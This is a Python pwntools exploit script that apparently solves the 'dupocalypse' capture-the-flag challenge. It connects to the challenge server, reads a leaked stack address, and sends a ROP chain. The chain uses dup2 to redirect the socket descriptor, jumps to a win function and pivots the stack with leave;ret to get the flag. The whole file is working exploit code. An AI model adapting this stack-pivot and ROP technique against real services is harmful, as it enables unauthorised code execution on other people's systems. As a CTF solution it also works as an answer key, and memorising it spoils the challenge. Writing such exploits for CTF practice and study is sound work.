from pwn import *

context.binary = binary = ELF('./dupocalypse', checksec=False)

rop = ROP(binary)

dup2 = p64(binary.plt.dup2)
win = p64(binary.symbols.pwn+26)

pop_rdi = p64(rop.find_gadget(['pop rdi','ret'])[0])
pop_rsi_r15 = p64(rop.find_gadget(['pop rsi','pop r15','ret'])[0])
leave_ret = p64(rop.find_gadget(['leave','ret'])[0])

#p = remote('localhost', 1337)
p = remote('dupocalypse.ctf.prgy.in', 1337, ssl=True)

p.recvuntil(b'The stack has spoken:')

buf = int(p.recvline()[:-1], 16)

ropchain = p64(buf)
ropchain += pop_rdi
ropchain += p64(4)
ropchain += pop_rsi_r15
ropchain += p64(0)
ropchain += p64(0)
ropchain += dup2
ropchain += pop_rdi
ropchain += p64(4)
ropchain += pop_rsi_r15
ropchain += p64(1)
ropchain += p64(0)
ropchain += dup2
ropchain += win
ropchain += b'A' * (256 - len(ropchain))
ropchain += p64(buf)
ropchain += leave_ret

p.sendline(ropchain)

for _ in range(3):
	p.recvline()

success(f'Flag: {p.recvline().decode().strip()[1:]}')
